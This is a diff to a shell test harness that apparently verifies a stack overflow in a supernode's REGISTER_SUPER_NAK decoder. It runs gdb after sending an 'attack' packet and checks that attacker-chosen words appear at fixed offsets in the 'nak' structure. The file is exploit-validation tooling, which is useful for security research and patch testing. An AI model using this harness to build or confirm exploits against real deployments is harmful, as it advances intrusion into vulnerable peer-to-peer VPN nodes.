@@ -138,6 +138,42 @@ grep -q 'sent safe NAK: len=86 token_size=48 token\[0:4\]=485a4d49' "$WORK/plain
     grep -q 'sent attack NAK: len=134 token_size=96 token\[0:4\]=485a4d49' "$WORK/plain-sender.log"
 check 15-chosen-wire-input "$?"
 
+# Rung-4 stack bytes: launch the plain supernode under gdb, break just
+# after decode_REGISTER_SUPER_NAK, and read the chosen words from the live
+# process. Skipped only when gdb is unavailable or NO_GDB=1.
+if command -v gdb >/dev/null 2>&1 && [ "${NO_GDB:-0}" != 1 ]; then
+    GPORT=$((BASE+30))
+    cat >"$WORK/gdb-plain.txt" <<EOF
+set pagination off
+set confirm off
+break sn_utils.c:2331
+run -f -p 127.0.0.1:$GPORT -t $((GPORT+1)) -c community.list -F labfed -M
+printf "HIT_PLAIN_AFTER_DECODE\n"
+printf "SLOT14=0x%lx\n", *(unsigned long *)((char *)&nak + 14)
+printf "SLOT96=0x%lx\n", *(unsigned long *)((char *)&nak + 96)
+printf "SLOT104=0x%lx\n", *(unsigned long *)((char *)&nak + 104)
+continue &
+shell sleep 5
+kill
+quit
+EOF
+    (cd "$PLAIN" && gdb -q -batch -x "$WORK/gdb-plain.txt" ./supernode) \
+        >"$WORK/gdb-plain.log" 2>&1 &
+    GPID=$!
+    sleep 4
+    python3 "$SEND" "$GPORT" attack >>"$WORK/gdb-sender.log" 2>&1
+    wait "$GPID" 2>/dev/null
+    grep -q HIT_PLAIN_AFTER_DECODE "$WORK/gdb-plain.log"
+    check 16-gdb-after-decode "$?"
+    grep -q 'SLOT14=0x494d5a48494d5a48' "$WORK/gdb-plain.log"
+    check 17-chosen-word-at-nak14 "$?"
+    grep -q 'SLOT96=0x5a48494d5a48494d' "$WORK/gdb-plain.log"
+    check 18-chosen-word-at-nak96 "$?"
+    grep -q 'SLOT104=0x494d5a48494d' "$WORK/gdb-plain.log"
+    check 19-chosen-word-at-nak104 "$?"
+else
+    echo "SKIP gdb chosen-byte checks (gdb absent or NO_GDB=1)"
+fi
 echo "RESULT $PASS PASS / $FAIL FAIL"
 echo "RAW $WORK"
 [ "$FAIL" -eq 0 ]
